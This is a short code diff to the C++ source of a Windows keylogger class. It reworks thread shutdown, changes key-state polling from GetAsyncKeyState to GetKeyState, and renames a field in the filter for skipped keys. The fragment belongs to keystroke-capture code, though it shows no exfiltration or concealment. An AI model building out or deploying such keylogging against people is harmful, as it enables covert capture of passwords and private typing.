@@ -20,10 +20,9 @@ void Keylogger::startKeylog() {
 	keylog = new std::thread(listener);
 }
 void Keylogger::stopKeylog() {
-	std::thread* temp = keylog;
+	keylog->join();
+	delete keylog;
 	keylog = nullptr;
-	temp->join();
-	delete temp;
 }
 bool Keylogger::isKeylogging() {
 	return keylog != nullptr;
@@ -31,7 +30,7 @@ bool Keylogger::isKeylogging() {
 
 void Keylogger::setKeysState() {
 	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
-		setKeyState(i, GetAsyncKeyState(i));
+		setKeyState(i, GetKeyState(i));
 	}
 }
 void Keylogger::handleOutput() {
@@ -53,8 +52,8 @@ void Keylogger::handleOutput() {
 
 			//If key is not worth to log
 			if (!key.isAlternating() || !key.isPressed() ||
-				key.value == VK_TAB || key.value == VK_RETURN || 
-				key.value == VK_BACK)
+				key.vk == VK_TAB || key.vk == VK_RETURN || 
+				key.vk == VK_BACK)
 			{
 				continue;
 			}
